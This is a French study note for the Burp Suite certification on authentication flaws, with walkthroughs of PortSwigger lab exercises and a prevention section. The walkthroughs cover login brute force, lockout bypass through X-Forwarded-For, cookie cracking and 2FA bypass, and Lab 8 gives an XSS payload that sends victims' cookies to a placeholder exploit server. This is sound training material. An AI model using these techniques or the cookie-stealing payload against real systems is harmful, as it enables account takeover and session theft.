---
tags: [bscp, server-side, authentication]
niveau: apprentice
statut: en cours
---
# Authentication

## En bref
- Processus qui consiste à vérifier qu'un utilisateur est bien celui qu'il prétend être (souvent via un formulaire nom d'utilisateur/mot de passe).
- Une authentification vulnérable permet à un attaquant d'accéder à des données ou fonctionnalités sensibles : compromission totale de l'application si le compte visé a des privilèges élevés (ex: admin système), accès à des données normalement hors de portée même via un compte à bas privilège, et élargissement de la surface d'attaque via l'accès à de nouvelles pages/fonctions.

![](Authentication.png)

## Types et variantes
- Authentification par mot de passe (formulaire de connexion) : l'utilisateur prouve son identité par la connaissance d'un secret.
- Authentification HTTP (Basic Auth) : le navigateur envoie un token `base64(username:password)` dans l'en-tête `Authorization` à chaque requête.
- Authentification multi-facteurs (voir [[Multi-factor-authentication]]) : combine plusieurs des facteurs ci-dessous.
- Les 3 facteurs d'authentification possibles :
	- Facteur de connaissance : quelque chose que l'on connaît (mot de passe, réponse à une question de sécurité).
	- Facteur de possession : quelque chose que l'on possède (objet physique, token, téléphone).
	- Facteur inhérent : quelque chose qui nous est propre (données biométriques).
- Deux origines de vulnérabilité à distinguer : faiblesse inhérente au mécanisme lui-même (pas de protection contre le brute force) contre faille logique ou erreur d'implémentation qui permet de contourner totalement le mécanisme.

| Type | Idée clé | Note | Niveau |
| --- | --- | --- | --- |
| Brute force et énumération des identifiants | réponses, longueur, temps différents | [[Auth-brute-force-identifiants]] | Apprentice |
| Contournement du verrouillage et du blocage IP | `X-Forwarded-For`, tableau JSON | [[Auth-contournement-blocage]] | Practitioner, Expert |
| HTTP Basic | `Authorization: Basic` | [[Auth-http-basic]] | Apprentice |
| Maintien de la connexion | cookie `base64(user:md5)` | [[Auth-maintien-connexion]] | Practitioner |
| Réinitialisation du mot de passe | token, `X-Forwarded-Host` | [[Auth-reinitialisation-mot-de-passe]] | Apprentice, Practitioner |
| Modification du mot de passe | champ masqué, oracle d'erreur | [[Auth-modification-mot-de-passe]] | Practitioner |
| Authentification multifacteur | accès direct, logique, brute force | [[Multi-factor-authentication]] | Apprentice à Expert |

## Comment détecter
- Vérifier si l'application divulgue des noms d'utilisateur valides : pages de profil publiques, adresses e-mail visibles dans les réponses HTTP, schéma prévisible type `prenom.nom@entreprise.com`, comptes à privilèges élevés avec des noms devinables (`admin`, `administrator`).
- Sur le formulaire de connexion, comparer les réponses entre un couple username/password totalement invalide et un username valide avec un password invalide : code de statut, message d'erreur, longueur de réponse, temps de réponse. Toute différence signale une énumération de username possible.
- Tester si un verrouillage de compte existe, et si oui, quel est son déclencheur exact (nombre de tentatives par compte, par IP, ou par la combinaison des deux).
- Repérer les mécanismes d'authentification en plusieurs étapes (2FA) pour vérifier si l'état de session est déjà "connecté" avant la validation complète de la deuxième étape.
- Vérifier le format des en-têtes de la requête si le site utilise l'authentification HTTP Basic (`Authorization: Basic ...`) et si le protocole HSTS est en place.

## Comment exploiter (principe)
1. Énumérer les noms d'utilisateur valides (différences de réponse, de longueur, de temps, verrouillage).
2. Forcer le mot de passe du compte identifié, en contournant les protections si besoin.
3. Si la page de connexion est solide, attaquer les fonctions annexes : cookie persistant, réinitialisation, modification du mot de passe.
4. Si un second facteur existe, chercher le contournement (voir [[Multi-factor-authentication]]).

Détails dans les notes de la table ci-dessus.


## Pièges et points d'attention BSCP
- Le verrouillage de compte ou d'IP n'est pas une protection absolue : inclure ses propres identifiants valides à intervalles réguliers dans la liste testée suffit souvent à passer sous le radar, ou révèle que le compteur se réinitialise après un login réussi.
- Toujours vérifier si le seuil de blocage est scopé par IP, par compte, ou par la combinaison des deux : ça change complètement la stratégie (rotation d'IP vs répartition sur plusieurs comptes).
- Une différence de temps de réponse peut être un signal d'énumération même quand les codes de statut et les messages sont identiques : ne pas se fier à un seul type de signal.
- Sur un mécanisme 2FA, vérifier si l'état de session est déjà "connecté" avant validation complète de la deuxième étape, et si le serveur revérifie bien cette étape avant d'afficher les pages protégées.

## Prévention
- Toujours renvoyer le même code de statut et le même message d'erreur générique, que le username ou le password soit invalide.
- Uniformiser le temps de réponse entre les cas valides et invalides (éviter qu'un traitement conditionnel, comme le hachage du mot de passe, ne s'exécute que si le username existe).
- Verrouiller le compte ciblé après un nombre élevé de tentatives infructueuses, et/ou bloquer l'IP distante en cas de fréquence de connexion anormale.
- Ne pas se reposer uniquement sur le blocage par IP pour la protection anti-brute-force : il est contournable par manipulation d'en-têtes si l'IP du client n'est pas déterminée de façon fiable côté serveur.
- Ne jamais utiliser l'authentification HTTP Basic seule pour protéger des ressources sensibles ; si utilisée, l'associer systématiquement à HSTS et à une protection anti-brute-force dédiée.

## Labs PortSwigger
- [x] Apprentice ✅ 2026-09-30
- [x] Practitioner ✅ 2026-09-30
- [ ] Expert

## Journal des labs

### Lab 1 - Énumération de noms d'utilisateur via des réponses différentes
*Username enumeration via different responses* - Apprentice - note : [[Auth-brute-force-identifiants]]

Le lab est vulnérable à l'énumération de noms d'utilisateur et au brute force. Trouvez le compte valide, forcez son mot de passe et accédez à sa page de compte.

1. Avec le proxy Burp actif, tentez une connexion et envoyez la requête `POST /login` dans Intruder.
2. Placez une position sur `username`, mettez un mot de passe bidon et chargez la liste des noms d'utilisateur candidats.
3. Lancez l'attaque : une réponse a une longueur différente et affiche `Incorrect password` au lieu de `Invalid username`. Notez ce nom d'utilisateur.
4. Remplacez la position par `password`, fixez le username trouvé et chargez la liste des mots de passe.
5. Lancez l'attaque : la réponse avec le code `302` donne le bon mot de passe.
6. Connectez-vous avec ces identifiants et ouvrez la page de compte.

### Lab 2 - Énumération de noms d'utilisateur via des réponses subtilement différentes
*Username enumeration via subtly different responses* - Practitioner - note : [[Auth-brute-force-identifiants]]

Même objectif, mais les réponses sont presque identiques.

1. Envoyez `POST /login` dans Intruder avec une position sur `username` et la liste des noms d'utilisateur.
2. Dans **Settings**, ajoutez une règle **Grep - Extract** sur le message d'erreur (`Invalid username or password.`).
3. Lancez l'attaque et triez sur cette colonne : une seule réponse a un message légèrement différent (le point final manque). Notez ce username.
4. Forcez ensuite son mot de passe avec Intruder et repérez le `302`.
5. Connectez-vous et ouvrez la page de compte.

### Lab 3 - Énumération de noms d'utilisateur via le temps de réponse
*Username enumeration via response timing* - Practitioner - note : [[Auth-brute-force-identifiants]]

Le lab bloque votre IP après trop d'essais, mais fait confiance à `X-Forwarded-For`. Le temps de réponse trahit les usernames valides.

1. Envoyez `POST /login` dans Repeater, ajoutez `X-Forwarded-For: 1.2.3.4` et constatez que changer la valeur évite le blocage.
2. Envoyez la requête dans Intruder en mode **Pitchfork** : position 1 sur la valeur de `X-Forwarded-For` (payload Numbers), position 2 sur `username`.
3. Utilisez un mot de passe très long (environ 100 caractères) : le temps de réponse augmente seulement pour un username valide.
4. Lancez l'attaque et repérez dans les colonnes de temps (**Response received**) le username dont le temps est nettement plus long.
5. Refaites l'attaque en Pitchfork avec `X-Forwarded-For` et `password` pour ce username, et repérez le `302`.
6. Connectez-vous et ouvrez la page de compte.

### Lab 4 - Protection anti brute force défaillante, blocage par IP
*Broken brute-force protection, IP block* - Practitioner - note : [[Auth-contournement-blocage]]

Après trois échecs, votre IP est bloquée. Le compteur se remet à zéro après une connexion réussie. Votre compte : `wiener:peter`. Victime : `carlos`.

1. Constatez le blocage après trois échecs, et que se connecter avec `wiener:peter` remet le compteur à zéro.
2. Envoyez `POST /login` dans Intruder en mode **Pitchfork**, positions sur `username` et `password`.
3. Construisez une liste de usernames alternant `wiener`, `carlos`, `wiener`, `carlos`, et une liste de mots de passe alternant `peter` puis un candidat, de sorte que chaque essai sur `carlos` soit précédé d'une connexion réussie de `wiener`.
4. Dans le **Resource pool**, limitez à une requête simultanée.
5. Lancez l'attaque et filtrez les requêtes de `carlos` : le `302` donne le mot de passe.
6. Connectez-vous avec `carlos` et ouvrez la page de compte.

### Lab 5 - Énumération de noms d'utilisateur via le verrouillage de compte
*Username enumeration via account lock* - Practitioner - note : [[Auth-brute-force-identifiants]]

Le lab verrouille le compte après trop d'essais, et ce comportement révèle les usernames valides.

1. Envoyez `POST /login` dans Intruder en mode **Cluster bomb**. Position 1 sur `username`, position 2 sur un paramètre factice ajouté (par exemple `username=§x§&password=§y§`), avec la liste des usernames et un payload **Null payloads** répété 5 fois.
2. Lancez l'attaque : un seul username reçoit le message `You have made too many incorrect login attempts`. Notez-le.
3. Forcez son mot de passe en Sniper avec la liste des mots de passe, avec une règle **Grep - Extract** sur le message d'erreur.
4. Un mot de passe valide produit une réponse sans message d'erreur de mot de passe incorrect (ou sans verrouillage). Attendez la fin du verrouillage (environ une minute) puis connectez-vous avec ce mot de passe.

### Lab 6 - Protection anti brute force défaillante, plusieurs identifiants par requête
*Broken brute-force protection, multiple credentials per request* - Expert - note : [[Auth-contournement-blocage]]

La connexion accepte du JSON. Accédez au compte de `carlos`.

1. Envoyez `POST /login` dans Repeater : le corps est du JSON (`{"username":"carlos","password":"..."}`).
2. Remplacez la valeur de `password` par un tableau contenant tous les mots de passe candidats : `"password":["123456","password","qwerty", ...]`.
3. Envoyez la requête : une seule requête teste tous les candidats et la réponse indique une connexion réussie.
4. Dans Burp, clic droit sur la requête puis **Show response in browser**, ouvrez le lien dans le navigateur pour obtenir la session de `carlos`.

### Lab 7 - Force brute d'un cookie de connexion persistante
*Brute-forcing a stay-logged-in cookie* - Practitioner - note : [[Auth-maintien-connexion]]

Le cookie « Stay logged in » est vulnérable. Accédez à la page de compte de `carlos`.

1. Connectez-vous avec `wiener:peter` en cochant « Stay logged in » et examinez le cookie `stay-logged-in` : décodé en base64, il vaut `wiener:` suivi du hash MD5 du mot de passe.
2. Envoyez `GET /my-account?id=wiener` avec ce cookie dans Intruder.
3. Chargez la liste des mots de passe et ajoutez dans **Payload processing**, dans l'ordre : **Hash** MD5, **Add prefix** `carlos:`, **Encode** Base64.
4. Ajoutez une règle **Grep - Match** sur `Update email`, qui n'apparaît que sur une page connectée.
5. Lancez l'attaque : la requête qui contient `Update email` donne le mot de passe de `carlos`.

### Lab 8 - Craquage de mot de passe hors ligne
*Offline password cracking* - Practitioner - note : [[Auth-maintien-connexion]]

Le cookie de session persistante contient un hash, et le site a une faille XSS stockée dans les commentaires. Connectez-vous à `carlos` et supprimez son compte.

1. Ouvrez l'exploit server et notez son URL.
2. Déposez en commentaire sur un article : `<script>document.location='//VOTRE-EXPLOIT-SERVER/'+document.cookie</script>`.
3. Dans le journal d'accès de l'exploit server, repérez la requête de `carlos` contenant son cookie `stay-logged-in`.
4. Décodez-le en base64 : `carlos:` suivi d'un hash MD5.
5. Retrouvez le mot de passe par une base de hashs MD5 ou un outil de craquage.
6. Connectez-vous en tant que `carlos` avec ce mot de passe et supprimez son compte depuis la page de compte.

### Lab 9 - Logique défaillante de réinitialisation du mot de passe
*Password reset broken logic* - Apprentice - note : [[Auth-reinitialisation-mot-de-passe]]

La réinitialisation ne vérifie pas le token à la soumission. Réinitialisez le mot de passe de `carlos`, puis connectez-vous.

1. Lancez une réinitialisation pour `wiener` et ouvrez le lien reçu dans le client e-mail : l'URL contient `temp-forgot-password-token`.
2. Saisissez un nouveau mot de passe et envoyez dans Repeater la requête `POST /forgot-password?temp-forgot-password-token=...`.
3. Supprimez la valeur du token dans l'URL et dans le corps : la requête fonctionne toujours.
4. Remplacez `username` par `carlos`, avec un nouveau mot de passe, et envoyez la requête.
5. Connectez-vous avec `carlos` et ce nouveau mot de passe.

### Lab 10 - Contournement simple de la 2FA
*2FA simple bypass* - Apprentice - note : [[MFA-acces-direct]]

Vous avez le mot de passe de `carlos` (`carlos:montoya`) mais pas son code 2FA.

1. Connectez-vous avec `wiener:peter`, validez la 2FA (code dans le client e-mail) et notez l'URL de la page de compte (`/my-account`).
2. Déconnectez-vous, puis connectez-vous avec `carlos:montoya`.
3. À la page qui demande le code, changez l'URL en `/my-account`.
4. La page de compte de `carlos` s'affiche sans code.

### Lab 11 - Logique défaillante de la 2FA
*2FA broken logic* - Practitioner - note : [[MFA-logique-defaillante]]

La 2FA se fie à un cookie pour savoir qui valide. Accédez à la page de compte de `carlos`.

1. Connectez-vous avec `wiener:peter`. Dans Burp, notez `POST /login2` avec le cookie `verify=wiener`.
2. Envoyez `GET /login2` dans Repeater, remplacez `verify` par `carlos` : le serveur génère un code pour `carlos`.
3. Connectez-vous avec `wiener:peter` à nouveau et envoyez `POST /login2` dans Intruder avec `verify=carlos` et une position sur `mfa-code`.
4. Payload **Numbers** de 0000 à 9999, pas 1, format avec 4 chiffres. Lancez l'attaque.
5. Repérez le `302`, puis **Show response in browser** pour ouvrir la session de `carlos`.

### Lab 12 - Contournement de la 2FA par force brute
*2FA bypass using a brute-force attack* - Expert - note : [[MFA-brute-force-code]]

Le code 2FA est forçable mais une déconnexion survient après deux mauvais essais. Accédez à la page de compte de `carlos` (`carlos:montoya`).

1. Étudiez le flux : `GET /login`, `POST /login`, `GET /login2`, `POST /login2`.
2. Créez une macro Burp qui rejoue `GET /login`, `POST /login` (avec `carlos:montoya`) et `GET /login2`.
3. Dans **Settings**, **Sessions**, ajoutez une règle de gestion de session qui exécute cette macro avant chaque requête vers `POST /login2`.
4. Envoyez `POST /login2` dans Intruder, position sur `mfa-code`, payload **Numbers** de 0000 à 9999, une seule requête simultanée.
5. Repérez le `302` et ouvrez la réponse dans le navigateur. Le code est valable pour une session donnée : la chance peut demander plusieurs passes.

## Mes notes
- Différence entre authentification et autorisation :
	- Authentification : processus qui consiste à vérifier qu'un utilisateur est bien celui qu'il prétend être.
	- Autorisation : consiste à vérifier si un utilisateur est autorisé à effectuer une action.

## Liens
- [[Auth-brute-force-identifiants]]
- [[Auth-contournement-blocage]]
- [[Auth-http-basic]]
- [[Auth-maintien-connexion]]
- [[Auth-reinitialisation-mot-de-passe]]
- [[Auth-modification-mot-de-passe]]
- [[Autres-mecanismes-authentification]]
- [[Access-control]]
- [[JWT-attacks]]
- [[OAuth]]
- [[Business-logic]]
- [[Multi-factor-authentication]]
- [[Payloads-cheatsheet]]
